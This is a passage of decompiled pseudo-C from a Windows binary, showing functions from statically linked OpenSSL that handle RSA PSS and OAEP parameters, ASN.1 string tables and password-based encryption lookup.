  return sub_44A2E0(a3, a1, *(_DWORD *)(a2 + 20), 0);
}

//----- (0044A480) --------------------------------------------------------
BOOL __cdecl sub_44A480(int a1, int a2, int a3)
{
  return sub_44A2E0(a3, a1, *(_DWORD *)(a2 + 20), 1);
}

//----- (0044A4A0) --------------------------------------------------------
int __usercall sub_44A4A0@<eax>(int *a1@<ebx>, int a2)
{
  int *v2; // eax
  int result; // eax
  int v4; // esi
  int *v5; // edi
  int *v6; // eax
  int *v7; // [esp-8h] [ebp-Ch]
  int *v8; // [esp-4h] [ebp-8h]

  *a1 = 0;
  v8 = *(int **)(a2 + 4);
  v2 = (int *)sub_41D2B0();
  result = sub_423FE0(v2, v8);
  v4 = result;
  if ( result )
  {
    v5 = *(int **)(result + 4);
    if ( v5 && sub_423680(*v5) == 911 )
    {
      v7 = (int *)v5[1];
      v6 = (int *)sub_42C6D0();
      *a1 = sub_423FE0(v6, v7);
      return v4;
    }
    else
    {
      *a1 = 0;
      return v4;
    }
  }
  return result;
}

//----- (0044A510) --------------------------------------------------------
BOOL __usercall sub_44A510@<eax>(int a1@<ebx>, int **a2@<edi>, int a3@<esi>, int *a4)
{
  int v5; // eax
  int *v6; // eax
  int v7; // eax
  int v8; // eax
  int v9; // eax

  if ( !a2 )
    return sub_4051D0(a3, (int)" (INVALID PSS PARAMETERS)\n") > 0;
  if ( sub_4051D0(a3, (int)"\n") <= 0 || !sub_405340(a3, a1, 128) || sub_4051D0(a3, (int)"Hash Algorithm: ") <= 0 )
    return 0;
  v5 = *a2 ? sub_422A00(a3, **a2) : sub_4051D0(a3, (int)"sha1 (default)");
  if ( v5 <= 0
    || sub_4051D0(a3, (int)"\n") <= 0
    || !sub_405340(a3, a1, 128)
    || sub_4051D0(a3, (int)"Mask Algorithm: ") <= 0 )
  {
    return 0;
  }
  v6 = a2[1];
  if ( v6 )
  {
    if ( sub_422A00(a3, *v6) <= 0 || sub_4051D0(a3, (int)" with ") <= 0 )
      return 0;
    if ( a4 )
      v7 = sub_422A00(a3, *a4);
    else
      v7 = sub_4051D0(a3, (int)"INVALID");
  }
  else
  {
    v7 = sub_4051D0(a3, (int)"mgf1 with sha1 (default)");
  }
  if ( v7 > 0 )
  {
    sub_4051D0(a3, (int)"\n");
    if ( sub_405340(a3, a1, 128) )
    {
      if ( sub_4051D0(a3, (int)"Salt Length: 0x") > 0 )
      {
        v8 = a2[2] ? sub_47A330(a3, a2[2]) : sub_4051D0(a3, (int)"14 (default)");
        if ( v8 > 0 )
        {
          sub_4051D0(a3, (int)"\n");
          if ( sub_405340(a3, a1, 128) )
          {
            if ( sub_4051D0(a3, (int)"Trailer Field: 0x") > 0 )
            {
              v9 = a2[3] ? sub_47A330(a3, a2[3]) : sub_4051D0(a3, (int)"BC (default)");
              if ( v9 > 0 )
              {
                sub_4051D0(a3, (int)"\n");
                return 1;
              }
            }
          }
        }
      }
    }
  }
  return 0;
}

//----- (0044A720) --------------------------------------------------------
BOOL __cdecl sub_44A720(int a1, int *a2, int *a3, int a4)
{
  int **v4; // eax
  int *v5; // ebp
  int v6; // edi
  BOOL v7; // ebx
  int *v9; // eax
  int *v10; // [esp+8h] [ebp-4h] BYREF

  if ( sub_423680(*a2) == 912 )
  {
    v4 = (int **)sub_44A4A0((int *)&v10, (int)a2);
    v5 = v10;
    v6 = (int)v4;
    v7 = sub_44A510(a4, v4, a1, v10);
    sub_41D2D0(v6);
    sub_42C730((int)v5);
    if ( !v7 )
      return 0;
    v9 = a3;
    if ( a3 )
      return sub_462040(a1, v9, a4);
  }
  else
  {
    v9 = a3;
    if ( a3 )
      return sub_462040(a1, v9, a4);
    if ( sub_4051D0(a1, (int)"\n") <= 0 )
      return 0;
  }
  return 1;
}

//----- (0044A7D0) --------------------------------------------------------
int __usercall sub_44A7D0@<eax>(int a1@<esi>, int *a2)
{
  int result; // eax
  int v3; // [esp+0h] [ebp-4h]

  if ( sub_435D30(v3) != 64 )
  {
    result = sub_42C720();
    *a2 = result;
    if ( !result )
      return result;
    sub_42C810(result, a1);
  }
  return 1;
}
// 44A7D1: variable 'v3' is possibly undefined

//----- (0044A800) --------------------------------------------------------
BOOL __usercall sub_44A800@<eax>(int a1@<ebx>, int *a2@<edi>)
{
  int v2; // esi
  int v4; // eax
  void *v5; // eax
  int v6; // eax
  char **v7; // eax
  int v8; // [esp+0h] [ebp-Ch]
  void *v9; // [esp+0h] [ebp-Ch]
  void *Block; // [esp+8h] [ebp-4h] BYREF

  v2 = 0;
  Block = 0;
  *a2 = 0;
  if ( sub_435D30(v8) == 64 )
    return 1;
  if ( sub_435D30(a1) == 64 )
    goto LABEL_6;
  v4 = sub_42C720();
  v2 = v4;
  if ( v4 )
  {
    sub_42C810(v4, a1);
LABEL_6:
    v5 = sub_42C6D0();
    if ( sub_43A6D0(v2, (int)v5, (void ***)&Block) )
    {
      v6 = sub_42C720();
      *a2 = v6;
      if ( v6 )
      {
        v9 = Block;
        v7 = sub_423310(0x38Fu);
        sub_42C750(*a2, (int)v7, 16, (int)v9);
        Block = 0;
      }
    }
  }
  sub_432A30((void **)Block);
  sub_42C730(v2);
  return *a2 != 0;
}
// 44A814: variable 'v8' is possibly undefined

//----- (0044A8C0) --------------------------------------------------------
const char *__cdecl sub_44A8C0(int *a1)
{
  int v2; // eax
  char *v3; // eax
  int v4; // esi

  if ( !a1 )
    return sub_42BEA0();
  v2 = sub_423680(*a1);
  v3 = sub_4233A0(v2);
  v4 = sub_430D80((int)v3);
  if ( !v4 )
    sub_408310(4, 156, 166, (int)"crypto\\rsa\\rsa_ameth.c", 409);
  return (const char *)v4;
}

//----- (0044A910) --------------------------------------------------------
const char *__usercall sub_44A910@<eax>(int *a1@<esi>, int *a2)
{
  const char *result; // eax
  int v3; // eax
  char *v4; // eax

  if ( !a2 )
    return sub_42BEA0();
  if ( sub_423680(*a2) == 911 )
  {
    if ( a1 )
    {
      v3 = sub_423680(*a1);
      v4 = sub_4233A0(v3);
      result = (const char *)sub_430D80((int)v4);
      if ( !result )
      {
        sub_408310(4, 157, 151, (int)"crypto\\rsa\\rsa_ameth.c", 430);
        return 0;
      }
    }
    else
    {
      sub_408310(4, 157, 154, (int)"crypto\\rsa\\rsa_ameth.c", 425);
      return 0;
    }
  }
  else
  {
    sub_408310(4, 157, 153, (int)"crypto\\rsa\\rsa_ameth.c", 421);
    return 0;
  }
  return result;
}

//----- (0044A9C0) --------------------------------------------------------
void *__thiscall sub_44A9C0(void *this)
{
  int *v2; // ebp
  int v3; // edi
  int v4; // esi
  _DWORD *v5; // eax
  void *v6; // eax
  int v8; // [esp+10h] [ebp-14h] BYREF
  int v9; // [esp+14h] [ebp-10h] BYREF
  void *Block; // [esp+18h] [ebp-Ch] BYREF
  int v11; // [esp+1Ch] [ebp-8h]
  int v12; // [esp+20h] [ebp-4h] BYREF

  v2 = 0;
  Block = 0;
  v3 = sub_432B60((int)this);
  v11 = 0;
  if ( sub_443A60((int)this, -1, 248, 13, 0, (int)&v9) > 0
    && sub_443A60((int)this, 6, 1016, 4104, 0, (int)&v12) > 0
    && sub_443A60((int)this, 6, 24, 4103, 0, (int)&v8) )
  {
    if ( v8 == -1 )
    {
      v8 = sub_407480(v9);
    }
    else if ( v8 == -2 )
    {
      v4 = -2 - sub_407480(v9);
      v8 = v4 + sub_41CA90(v3);
      if ( (((unsigned __int8)sub_41CA70(v3) - 1) & 7) == 0 )
        --v8;
    }
    v2 = (int *)sub_41D2C0();
    if ( v2 )
    {
      if ( v8 == 20 || (v5 = sub_42C490(), (v2[2] = (int)v5) != 0) && sub_431840((int)v5, v8) )
      {
        if ( sub_44A7D0(v9, v2) )
        {
          if ( sub_44A800(v12, v2 + 1) )
          {
            v6 = sub_41D2B0();
            if ( sub_43A6D0((int)v2, (int)v6, (void ***)&Block) )
              v11 = 1;
          }
        }
      }
    }
  }
  sub_41D2D0((int)v2);
  if ( v11 )
    return Block;
  sub_432A30((void **)Block);
  return 0;
}

//----- (0044AB40) --------------------------------------------------------
int __cdecl sub_44AB40(int a1, int a2, int a3)
{
  int *v3; // ecx
  int v4; // esi
  int v6; // eax
  int v7; // edi
  const char *v8; // ebp
  int *v9; // ebx
  int v10; // esi
  int v11; // eax
  int v12; // [esp-4h] [ebp-18h]
  int *v13; // [esp+4h] [ebp-10h] BYREF
  int v14; // [esp+8h] [ebp-Ch]
  int v15; // [esp+Ch] [ebp-8h] BYREF
  int v16; // [esp+10h] [ebp-4h]

  v4 = (int)v3;
  v12 = *v3;
  v14 = -1;
  if ( sub_423680(v12) != 912 )
  {
    sub_408310(4, 155, 155, (int)"crypto\\rsa\\rsa_ameth.c", 503);
    return -1;
  }
  v6 = sub_44A4A0((int *)&v13, v4);
  v7 = v6;
  if ( v6 )
  {
    v8 = sub_44A910(v13, *(int **)(v6 + 4));
    if ( !v8 )
      goto LABEL_20;
    v9 = (int *)sub_44A8C0(*(int **)v7);
    if ( !v9 )
      goto LABEL_20;
    if ( *(_DWORD *)(v7 + 8) )
    {
      v10 = sub_431860(*(unsigned int **)(v7 + 8));
      if ( v10 < 0 )
      {
        sub_408310(4, 155, 150, (int)"crypto\\rsa\\rsa_ameth.c", 528);
        goto LABEL_20;
      }
    }
    else
    {
      v10 = 20;
    }
    if ( !*(_DWORD *)(v7 + 12) || sub_431860(*(unsigned int **)(v7 + 12)) == 1 )
    {
      if ( a3 )
      {
        if ( !sub_44FE40(a1, &a2, v9, 0, a3) )
          goto LABEL_20;
      }
      else
      {
        if ( sub_443A60(a2, -1, 248, 13, 0, (int)&v15) <= 0 )
          goto LABEL_20;
        v16 = sub_435D30(v15);
        v11 = sub_435D30((int)v9);
        if ( v11 != v16 )
        {
          sub_408310(4, 155, 158, (int)"crypto\\rsa\\rsa_ameth.c", 553);
          goto LABEL_20;
        }
      }
      if ( sub_443A60(a2, 6, -1, 4097, 6, 0) > 0
        && sub_443A60(a2, 6, 24, 4098, v10, 0) > 0
        && sub_443A60(a2, 6, 1016, 4101, 0, (int)v8) > 0 )
      {
        v14 = 1;
      }
      goto LABEL_20;
    }
    sub_408310(4, 155, 139, (int)"crypto\\rsa\\rsa_ameth.c", 539);
  }
  else
  {
    sub_408310(4, 155, 149, (int)"crypto\\rsa\\rsa_ameth.c", 510);
  }
LABEL_20:
  sub_41D2D0(v7);
  sub_42C730((int)v13);
  return v14;
}
// 44AB4B: variable 'v3' is possibly undefined

//----- (0044AD80) --------------------------------------------------------
int __usercall sub_44AD80@<eax>(_DWORD *a1@<esi>)
{
  int v1; // edi
  int v2; // eax
  int v4; // [esp+0h] [ebp-10h]
  int *v5; // [esp+8h] [ebp-8h] BYREF
  int v6; // [esp+Ch] [ebp-4h] BYREF

  v1 = sub_432E80(v4);
  sub_479CD0(a1, 0, 0, 0, &v5);
  v2 = sub_423680(*v5);
  if ( v2 == 6 )
    return 1;
  if ( v2 == 912 )
    return sub_44AB40(0, v1, 0);
  return sub_44BA60(v2, 0, &v6) && v6 == 6;
}
// 44AD8C: variable 'v4' is possibly undefined

//----- (0044AE10) --------------------------------------------------------
int __cdecl sub_44AE10(int a1, int a2, int a3, int *a4, int a5, int a6)
{
  if ( sub_423680(*a4) == 912 )
    return sub_44AB40(a1, 0, a6) <= 0 ? -1 : 2;
  sub_408310(4, 148, 155, (int)"crypto\\rsa\\rsa_ameth.c", 607);
  return -1;
}

//----- (0044AE70) --------------------------------------------------------
int __usercall sub_44AE70@<eax>(_DWORD *a1@<edi>)
{
  void *v1; // esi
  char **v3; // eax
  void *v4; // eax
  char **v5; // eax
  int v6; // [esp+0h] [ebp-10h]
  int v7; // [esp+0h] [ebp-10h]
  int v8; // [esp+8h] [ebp-8h] BYREF
  int v9; // [esp+Ch] [ebp-4h] BYREF

  v8 = 1;
  v1 = (void *)sub_432E80(v6);
  sub_479CD0(a1, 0, 0, 0, &v9);
  if ( v1 && sub_443A60((int)v1, 6, -1, 4102, 0, (int)&v8) <= 0 )
    return 0;
  if ( v8 == 1 )
  {
    v3 = sub_423310(6u);
    sub_42C750(v9, (int)v3, 5, 0);
    return 1;
  }
  else
  {
    if ( v8 != 6 )
      return 0;
    v4 = sub_44A9C0(v1);
    if ( !v4 )
      return 0;
    v7 = (int)v4;
    v5 = sub_423310(0x390u);
    sub_42C750(v9, (int)v5, 16, v7);
    return 1;
  }
}
// 44AE84: variable 'v6' is possibly undefined

//----- (0044AF30) --------------------------------------------------------
int __cdecl sub_44AF30(FILE *Stream, int a2, int a3, int a4, int a5)
{
  void *v5; // esi
  void **v7; // eax
  void **v8; // esi
  void **v9; // eax
  char **v10; // eax
  char **v11; // eax
  int v12; // [esp-8h] [ebp-10h]
  int v13; // [esp+4h] [ebp-4h] BYREF

  v5 = (void *)_fileno(Stream);
  if ( sub_443A60((int)v5, 6, -1, 4102, 0, (int)&v13) <= 0 )
    return 0;
  if ( v13 != 6 )
    return 2;
  v7 = (void **)sub_44A9C0(v5);
  v8 = v7;
  if ( !v7 )
    return 0;
  if ( a5 )
  {
    v9 = sub_432E00((int)v7);
    if ( !v9 )
    {
      sub_432A30(v8);
      return 0;
    }
    v12 = (int)v9;
    v10 = sub_423310(0x390u);
    sub_42C750(a5, (int)v10, 16, v12);
  }
  v11 = sub_423310(0x390u);
  sub_42C750(a4, (int)v11, 16, (int)v8);
  return 3;
}

//----- (0044B000) --------------------------------------------------------
int __usercall sub_44B000@<eax>(int *a1@<ebx>, int a2)
{
  int *v2; // eax
  int result; // eax
  int v4; // esi
  int *v5; // edi
  int *v6; // eax
  int *v7; // [esp-8h] [ebp-Ch]
  int *v8; // [esp-4h] [ebp-8h]

  *a1 = 0;
  v8 = *(int **)(a2 + 4);
  v2 = (int *)sub_41D2F0();
  result = sub_423FE0(v2, v8);
  v4 = result;
  if ( result )
  {
    v5 = *(int **)(result + 4);
    if ( v5 && sub_423680(*v5) == 911 )
    {
      v7 = (int *)v5[1];
      v6 = (int *)sub_42C6D0();
      *a1 = sub_423FE0(v6, v7);
      return v4;
    }
    else
    {
      *a1 = 0;
      return v4;
    }
  }
  return result;
}

//----- (0044B070) --------------------------------------------------------
int __thiscall sub_44B070(_DWORD *this)
{
  int v2; // ebp
  int v4; // eax
  int v5; // eax
  int v6; // ebx
  int *v7; // edi
  _DWORD *v8; // ecx
  int v9; // eax
  int v10; // esi
  int v11; // edi
  int *v12; // [esp+Ch] [ebp-1Ch] BYREF
  int *v13; // [esp+10h] [ebp-18h] BYREF
  int v14; // [esp+14h] [ebp-14h]
  int v15; // [esp+18h] [ebp-10h]
  const char *v16; // [esp+20h] [ebp-8h]
  const char *v17; // [esp+24h] [ebp-4h]

  v14 = -1;
  v15 = 0;
  v2 = sub_478670(this);
  if ( !v2 )
    return 0;
  if ( !sub_478690(this, 0, 0, &v12) )
    return -1;
  v4 = sub_423680(*v12);
  if ( v4 == 6 )
    return 1;
  if ( v4 != 919 )
  {
    sub_408310(4, 159, 162, (int)"crypto\\rsa\\rsa_ameth.c", 715);
    return -1;
  }
  v5 = sub_44B000((int *)&v13, (int)v12);
  v6 = v5;
  if ( v5 )
  {
    v17 = sub_44A910(v13, *(int **)(v5 + 4));
    if ( !v17 )
      goto LABEL_25;
    v16 = sub_44A8C0(*(int **)v6);
    if ( !v16 )
      goto LABEL_25;
    v7 = *(int **)(v6 + 8);
    if ( v7 )
    {
      if ( sub_423680(*v7) != 935 )
      {
        sub_408310(4, 159, 163, (int)"crypto\\rsa\\rsa_ameth.c", 736);
        goto LABEL_25;
      }
      v8 = (_DWORD *)v7[1];
      if ( *v8 != 4 )
      {
        sub_408310(4, 159, 160, (int)"crypto\\rsa\\rsa_ameth.c", 740);
        goto LABEL_25;
      }
      v9 = v8[1];
      v10 = *(_DWORD *)(v9 + 8);
      *(_DWORD *)(v9 + 8) = 0;
      v11 = **(_DWORD **)(v7[1] + 4);
    }
    else
    {
      v11 = v15;
      v10 = v15;
    }
    if ( sub_443A60(v2, 6, -1, 4097, 4, 0) > 0
      && sub_443A60(v2, 6, 768, 4105, 0, (int)v16) > 0
      && sub_443A60(v2, 6, 1016, 4101, 0, (int)v17) > 0
      && sub_443A60(v2, 6, 768, 4106, v11, v10) > 0 )
    {
      v14 = 1;
    }
    goto LABEL_25;
  }
  sub_408310(4, 159, 161, (int)"crypto\\rsa\\rsa_ameth.c", 722);
LABEL_25:
  sub_41D310(v6);
  sub_42C730((int)v13);
  return v14;
}

//----- (0044B2A0) --------------------------------------------------------
int __thiscall sub_44B2A0(_DWORD *this)
{
  int v2; // esi
  char **v4; // eax
  int v5; // ebp
  int *v6; // eax
  int v7; // eax
  _DWORD *v8; // eax
  void *v9; // esi
  char **v10; // eax
  void *v11; // eax
  char **v12; // eax
  void *v13; // [esp-8h] [ebp-34h]
  int v14; // [esp+Ch] [ebp-20h]
  void *Block; // [esp+10h] [ebp-1Ch] BYREF
  int v16; // [esp+14h] [ebp-18h] BYREF
  int v17; // [esp+18h] [ebp-14h] BYREF
  int v18; // [esp+1Ch] [ebp-10h]
  int v19; // [esp+20h] [ebp-Ch] BYREF
  int v20; // [esp+24h] [ebp-8h] BYREF
  void *Src; // [esp+28h] [ebp-4h] BYREF

  v14 = 0;
  Block = 0;
  v2 = sub_478670(this);
  v16 = 1;
  v18 = 0;
  sub_478690(this, 0, 0, &v17);
  if ( v2 && sub_443A60(v2, 6, -1, 4102, 0, (int)&v16) <= 0 )
    return 0;
  if ( v16 == 1 )
  {
    v4 = sub_423310(6u);
    sub_42C750(v17, (int)v4, 5, 0);
    return 1;
  }
  if ( v16 != 4 )
    return 0;
  if ( sub_443A60(v2, 6, 768, 4107, 0, (int)&v19) > 0 && sub_443A60(v2, 6, 1016, 4104, 0, (int)&v20) > 0 )
  {
    v5 = sub_443A60(v2, 6, 768, 4108, 0, (int)&Src);
    if ( v5 >= 0 )
    {
      v6 = (int *)sub_41D300();
      v14 = (int)v6;
      if ( v6 )
      {
        if ( sub_44A7D0(v19, v6) && sub_44A800(v20, (int *)(v14 + 4)) )
        {
          if ( v5 > 0 )
          {
            v7 = sub_42C720();
            *(_DWORD *)(v14 + 8) = v7;
            if ( !v7 )
              goto LABEL_21;
            v8 = sub_42C430();
            v9 = v8;
            if ( !v8 )
              goto LABEL_21;
            if ( !sub_437A10((int)v8, Src, v5) )
            {
              sub_42C4F0(v9);
              goto LABEL_21;
            }
            v10 = sub_423310(0x3A7u);
            sub_42C750(*(_DWORD *)(v14 + 8), (int)v10, 4, (int)v9);
          }
          v11 = sub_41D2F0();
          if ( sub_43A6D0(v14, (int)v11, (void ***)&Block) )
          {
            v13 = Block;
            v12 = sub_423310(0x397u);
            sub_42C750(v17, (int)v12, 16, (int)v13);
            Block = 0;
            v18 = 1;
          }
        }
      }
    }
  }
LABEL_21:
  sub_41D310(v14);
  sub_432A30((void **)Block);
  return v18;
}

//----- (0044B4C0) --------------------------------------------------------
int __cdecl sub_44B4C0(int a1, int a2, int a3, _DWORD *a4)
{
  char **v4; // eax
  int result; // eax
  int v6; // [esp+0h] [ebp-4h] BYREF

  v6 = 0;
  switch ( a2 )
  {
    case 1:
      if ( a3 )
        goto LABEL_6;
      sub_4345B0(a4, 0, 0, &v6);
      goto LABEL_4;
    case 2:
      if ( !a3 )
      {
        sub_4345E0((int)a4, &v6);
LABEL_4:
        if ( v6 )
        {
          v4 = sub_423310(6u);
          sub_42C750(v6, (int)v4, 5, 0);
        }
      }
      goto LABEL_6;
    case 3:
      *a4 = 672;
      return 1;
    case 5:
      if ( !a3 )
        return sub_44AE70(a4);
      if ( a3 != 1 )
        goto LABEL_6;
      result = sub_44AD80(a4);
      break;
    case 7:
      if ( a3 )
      {
        if ( a3 == 1 )
          result = sub_44B070(a4);
        else
LABEL_6:
          result = 1;
      }
      else
      {
        result = sub_44B2A0(a4);
      }
      break;
    case 8:
      *a4 = 0;
      return 1;
    default:
      return -2;
  }
  return result;
}

//----- (0044B5E0) --------------------------------------------------------
int __cdecl sub_44B5E0(int a1, int a2)
{
  int result; // eax
  int v3; // eax

  result = *(_DWORD *)a1 - *(_DWORD *)a2;
  if ( *(_DWORD *)a1 == *(_DWORD *)a2 )
  {
    if ( dword_539268 && sub_426A30((int)dword_539268) > *(_DWORD *)a1 )
    {
      v3 = sub_426A40((int *)dword_539268, *(_DWORD *)a1);
      return (*(int (__cdecl **)(_DWORD, _DWORD))(v3 + 4))(*(_DWORD *)(a1 + 8), *(_DWORD *)(a2 + 8));
    }
    else
    {
      return strcmp(*(const char **)(a1 + 8), *(const char **)(a2 + 8));
    }
  }
  return result;
}

//----- (0044B660) --------------------------------------------------------
int __cdecl sub_44B660(int a1)
{
  int (__cdecl **v1)(_DWORD); // eax

  if ( !dword_539268 || sub_426A30((int)dword_539268) <= *(_DWORD *)a1 )
    return sub_424590(*(_BYTE **)(a1 + 8)) ^ *(_DWORD *)a1;
  v1 = (int (__cdecl **)(_DWORD))sub_426A40((int *)dword_539268, *(_DWORD *)a1);
  return (*v1)(*(_DWORD *)(a1 + 8)) ^ *(_DWORD *)a1;
}

//----- (0044B6B0) --------------------------------------------------------
int __cdecl sub_44B6B0(int a1, int a2)
{
  int result; // eax
  int *v3; // esi
  int v4; // eax
  int v5[4]; // [esp+0h] [ebp-10h] BYREF

  result = (int)dword_539270;
  if ( dword_539270 )
  {
    v5[2] = a1;
    v5[0] = a2 & 0xFFFF7FFF;
    v3 = (int *)sub_424710(dword_539270, (int)v5);
    if ( v3 )
    {
      if ( dword_539268 )
      {
        if ( sub_426A30((int)dword_539268) > *v3 )
        {
          v4 = sub_426A40((int *)dword_539268, *v3);
          (*(void (__cdecl **)(int, int, int))(v4 + 8))(v3[2], *v3, v3[3]);
        }
      }
      sub_413490(v3);
      return 1;
    }
    else
    {
      return 0;
    }
  }
  return result;
}

//----- (0044B780) --------------------------------------------------------
void __cdecl sub_44B780(void *Block)
{
  sub_413490(Block);
}

//----- (0044B7A0) --------------------------------------------------------
void __cdecl sub_44B7A0(int a1)
{
  int v1; // edi

  if ( dword_539270 )
  {
    dword_53926C = a1;
    v1 = sub_404FF0((int)dword_539270);
    sub_404FE0((int)dword_539270, 0);
    sub_424330(dword_539270, (void (__cdecl *)(_DWORD))sub_44B750);
    if ( a1 >= 0 )
    {
      sub_404FE0((int)dword_539270, v1);
    }
    else
    {
      sub_424260((void **)dword_539270);
      sub_426C00(dword_539268, (void (__cdecl *)(_DWORD))sub_44B780);
      dword_539270 = 0;
      dword_539268 = 0;
    }
  }
}
// 44B750: using guessed type int sub_44B750();
// 53926C: using guessed type int dword_53926C;

//----- (0044B830) --------------------------------------------------------
BOOL sub_44B830()
{
  if ( dword_539270 )
    return 1;
  sub_43C2A0();
  dword_539270 = sub_4245F0(
                   (int (__cdecl *)(_BYTE *))sub_44B660,
                   (int (__cdecl *)(const char *, const char *))sub_44B5E0);
  sub_43C2A0();
  return dword_539270 != 0;
}

//----- (0044B870) --------------------------------------------------------
int __cdecl sub_44B870(int a1, int a2)
{
  int v2; // ebx
  _DWORD *v4; // eax
  int v5[2]; // [esp+8h] [ebp-10h] BYREF
  int v6; // [esp+10h] [ebp-8h]

  v2 = 0;
  if ( !a1 || !dword_539270 && !sub_44B830() )
    return 0;
  v5[0] = a2 & 0xFFFF7FFF;
  v6 = a1;
  v4 = sub_424780((int)dword_539270, (int)v5);
  if ( !v4 )
    return 0;
  while ( v4[1] && (a2 & 0x8000) == 0 )
  {
    if ( ++v2 <= 10 )
    {
      v6 = v4[3];
      v4 = sub_424780((int)dword_539270, (int)v5);
      if ( v4 )
        continue;
    }
    return 0;
  }
  return v4[3];
}

//----- (0044B920) --------------------------------------------------------
int __cdecl sub_44B920(int a1, int a2, int a3)
{
  int result; // eax
  void *v4; // esi
  int *v5; // edi
  int v6; // eax
  _DWORD *v7; // [esp-10h] [ebp-10h]

  if ( dword_539270
    || (sub_43C2A0(),
        dword_539270 = sub_4245F0(
                         (int (__cdecl *)(_BYTE *))sub_44B660,
                         (int (__cdecl *)(const char *, const char *))sub_44B5E0),
        sub_43C2A0(),
        result = dword_539270 != 0,
        dword_539270) )
  {
    result = (int)sub_4133F0(0x10u);
    v4 = (void *)result;
    if ( result )
    {
      *(_DWORD *)(result + 8) = a1;
      *(_DWORD *)result = a2 & 0xFFFF7FFF;
      v7 = dword_539270;
      *(_DWORD *)(result + 4) = a2 & 0x8000;
      *(_DWORD *)(result + 12) = a3;
      v5 = sub_424680(v7, result);
      if ( v5 )
      {
        if ( dword_539268 )
        {
          if ( sub_426A30((int)dword_539268) > *v5 )
          {
            v6 = sub_426A40((int *)dword_539268, *v5);
            (*(void (__cdecl **)(int, int, int))(v6 + 8))(v5[2], *v5, v5[3]);
          }
        }
        sub_413490(v5);
        return 1;
      }
      if ( !sub_4245E0((int)dword_539270) )
        return 1;
      sub_413490(v4);
      return 0;
    }
  }
  return result;
}

//----- (0044BA40) --------------------------------------------------------
int __cdecl sub_44BA40(int a1, int a2)
{
  int result; // eax

  result = *(_DWORD *)(*(_DWORD *)a1 + 4) - *(_DWORD *)(*(_DWORD *)a2 + 4);
  if ( !result )
    return *(_DWORD *)(*(_DWORD *)a1 + 8) - *(_DWORD *)(*(_DWORD *)a2 + 8);
  return result;
}

//----- (0044BA60) --------------------------------------------------------
int __cdecl sub_44BA60(int a1, _DWORD *a2, _DWORD *a3)
{
  int v3; // eax
  int result; // eax
  int v5[3]; // [esp+0h] [ebp-Ch] BYREF

  v5[0] = a1;
  if ( dword_539278
    && (v3 = sub_426BE0((int)dword_539278, (int)v5), v3 >= 0)
    && (result = sub_426A40((int *)dword_539278, v3)) != 0
    || (result = sub_423650((int)v5, (int)"\a", 42, 12, (int (__cdecl *)(int, int))sub_42AC20)) != 0 )
  {
    if ( a2 )
      *a2 = *(_DWORD *)(result + 4);
    if ( a3 )
      *a3 = *(_DWORD *)(result + 8);
    return 1;
  }
  return result;
}

//----- (0044BAF0) --------------------------------------------------------
int __cdecl sub_44BAF0(_DWORD *a1, int a2, int a3)
{
  int v3; // eax
  int result; // eax
  char *v5; // [esp+0h] [ebp-10h] BYREF
  char v6[4]; // [esp+4h] [ebp-Ch] BYREF
  int v7; // [esp+8h] [ebp-8h]
  int v8; // [esp+Ch] [ebp-4h]

  v5 = v6;
  v7 = a2;
  v8 = a3;
  if ( dword_539274 && (v3 = sub_426BE0((int)dword_539274, (int)v6), v3 >= 0) )
  {
    v5 = (char *)sub_426A40((int *)dword_539274, v3);
    result = (int)&v5;
  }
  else
  {
    result = sub_423650((int)&v5, (int)&off_50D9F0, 39, 4, sub_44BA40);
    if ( !result )
      return result;
  }
  if ( a1 )
    *a1 = **(_DWORD **)result;
  return 1;
}
// 50D9F0: using guessed type char *off_50D9F0;
// 44BAF0: using guessed type char var_C[4];

//----- (0044BBE0) --------------------------------------------------------
int __cdecl sub_44BBE0(_DWORD *a1, _DWORD *a2)
{
  int result; // eax

  result = *a1 - *a2;
  if ( *a1 == *a2 )
    return a1[1] - a2[1];
  return result;
}

//----- (0044BC00) --------------------------------------------------------
int __cdecl sub_44BC00(int a1, int a2, _DWORD *a3, _DWORD *a4, _DWORD *a5)
{
  int v6; // eax
  _DWORD *v7; // eax
  int v8[5]; // [esp+0h] [ebp-14h] BYREF

  if ( !a2 )
    return 0;
  v8[1] = a2;
  v8[0] = a1;
  if ( !dword_53927C
    || (v6 = sub_426BE0((int)dword_53927C, (int)v8), v6 == -1)
    || (v7 = (_DWORD *)sub_426A40((int *)dword_53927C, v6)) == 0 )
  {
    v7 = (_DWORD *)sub_423650((int)v8, (int)&unk_50DAA8, 25, 20, (int (__cdecl *)(int, int))sub_44BBE0);
    if ( !v7 )
      return 0;
  }
  if ( a3 )
    *a3 = v7[2];
  if ( a4 )
    *a4 = v7[3];
  if ( a5 )
    *a5 = v7[4];
  return 1;
}

//----- (0044BCA0) --------------------------------------------------------
void __cdecl sub_44BCA0(void *Block)
{
  sub_413490(Block);
}

//----- (0044BCC0) --------------------------------------------------------
void sub_44BCC0()
{
  sub_426C00(dword_53927C, (void (__cdecl *)(_DWORD))sub_44BCA0);
  dword_53927C = 0;
}

//----- (0044BCE0) --------------------------------------------------------
int __cdecl sub_44BCE0(int a1, const char *a2, unsigned int a3, int a4, int a5, int a6)
{
  int v6; // eax
  unsigned int v8; // edi
  int v9; // esi
  int v10; // eax
  char *v11; // eax
  char *v12; // eax
  unsigned int v13; // [esp+10h] [ebp-60h] BYREF
  int (__cdecl *v14)(int, const char *, unsigned int, int, int, int, int); // [esp+14h] [ebp-5Ch] BYREF
  unsigned int v15; // [esp+18h] [ebp-58h] BYREF
  char v16[80]; // [esp+1Ch] [ebp-54h] BYREF

  v6 = sub_423680(a1);
  if ( sub_44BC00(0, v6, &v13, &v15, &v14) )
  {
    if ( a2 )
    {
      v8 = a3;
      if ( a3 == -1 )
        v8 = strlen(a2);
    }
    else
    {
      v8 = 0;
    }
    if ( v13 == -1 )
    {
      v9 = 0;
    }
    else
    {
      v11 = sub_4233A0(v13);
      v9 = sub_430D50((int)v11);
      if ( !v9 )
      {
        sub_408310(6, 116, 160, (int)"crypto\\evp\\evp_pbe.c", 110);
        return 0;
      }
    }
    if ( v15 == -1 )
    {
      v10 = 0;
    }
    else
    {
      v12 = sub_4233A0(v15);
      v10 = sub_430D80((int)v12);
      if ( !v10 )
      {
        sub_408310(6, 116, 161, (int)"crypto\\evp\\evp_pbe.c", 120);
        return 0;
      }
    }
    if ( v14(a5, a2, v8, a4, v9, v10, a6) )
    {
      return 1;
    }
    else
    {
      sub_408310(6, 116, 120, (int)"crypto\\evp\\evp_pbe.c", 126);
      return 0;
    }
  }
  else
  {
    sub_408310(6, 116, 121, (int)"crypto\\evp\\evp_pbe.c", 91);
    if ( a1 )
      sub_4229E0(v16, 80, a1);
    else
